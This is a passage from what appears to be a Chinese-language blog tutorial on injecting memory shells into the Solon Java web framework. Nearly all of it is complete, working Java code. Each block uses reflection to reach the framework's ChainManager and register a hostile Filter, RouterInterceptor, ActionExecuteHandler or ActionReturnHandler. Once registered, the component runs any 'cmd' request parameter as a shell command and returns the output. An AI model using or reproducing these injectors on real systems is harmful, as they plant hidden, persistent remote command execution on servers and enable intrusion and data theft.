class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(ctx);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addFilter(evilFilter,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject Filter Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729587464456-2434eac5-4fb7-40a4-aaf5-dab9a4b2704e.png"></p><h3 id="RouterInterceptor"><a href="#RouterInterceptor" class="headerlink" title="RouterInterceptor"></a>RouterInterceptor</h3><p>RouterInterceptor内存马与Filter内存马基本类似，在上文分析<font style="color:#000000;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper类</font>时，可以看到<font style="color:#000000;">还有添加路由拦截器的方法，通过addInterceptor方法来添加Interceptor。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729588686707-8fd36dc7-9cb3-4797-9c99-b05537cd492c.png"></p><p><font style="color:#000000;">Interceptor</font>内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Handler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.PathRule;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterInterceptorChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterceptorMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-interceptor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addInterceptor(<span class="keyword">new</span> <span class="title class_">EvilRouterInterceptor</span>(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject Interceptor Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilRouterInterceptor</span> <span class="keyword">implements</span> <span class="title class_">RouterInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PathRule <span class="title function_">pathPatterns</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">//null 表示全部, 这里指定拦截路由hello</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PathRule</span>().include(<span class="string">&quot;/hello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doIntercept</span><span class="params">(Context ctx, Handler mainHandler, RouterInterceptorChain chain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doIntercept(ctx, mainHandler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729589730811-98b802fa-f611-434d-b229-ea0b74a0f0ee.png"></p><h3 id="ActionExecuteHandler"><a href="#ActionExecuteHandler" class="headerlink" title="ActionExecuteHandler"></a>ActionExecuteHandler</h3><p>在<font style="color:#000000;">org.noear.solon.core.ChainManager类中，可以看到不仅有addFilter方法和addInterceptor方法，还有addExecuteHandler方法，因此可以采用通过添加恶意Action执行器的方式来打入内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729589890377-1f9cc8ca-8205-4238-9c57-ce787b03fe4b.png"></p><p>ActionExecuteHandler内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ActionExecuteHandler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.wrap.MethodWrap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActionExecuteHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-execute-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addExecuteHandler(<span class="keyword">new</span> <span class="title class_">EvilExecuteHandler</span>(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject ActionExecuteHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecuteHandler</span> <span class="keyword">implements</span> <span class="title class_">ActionExecuteHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matched</span><span class="params">(Context ctx, String mime)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object[] resolveArguments(Context ctx, Object target, MethodWrap mWrap) <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">executeHandle</span><span class="params">(Context ctx, Object target, MethodWrap mWrap)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729590810612-9e832f8f-dc67-411e-abaa-f3c987d3c373.png"></p><h3 id="ActionReturnHandler"><a href="#ActionReturnHandler" class="headerlink" title="ActionReturnHandler"></a>ActionReturnHandler</h3><p>和<font style="color:#000000;">打入ActionExecuteHandler内存马类似，在org.noear.solon.core.ChainManager类中还有addReturnHandler方法，它允许开发者对控制器方法的返回值进行自定义处理，因此也可以通过添加恶意的ActionReturnHandler来打入内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729590138906-ce6d6606-1450-4629-b083-099a7950993e.png"></p><p><font style="color:#000000;">ActionReturnHandler</font>内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Action;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ActionReturnHandler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActionReturnHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-return-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addReturnHandler(<span class="keyword">new</span> <span class="title class_">EvilReturnHandler</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject ActionReturnHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilReturnHandler</span> <span class="keyword">implements</span> <span class="title class_">ActionReturnHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matched</span><span class="params">(Context ctx, Class&lt;?&gt; returnType)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] 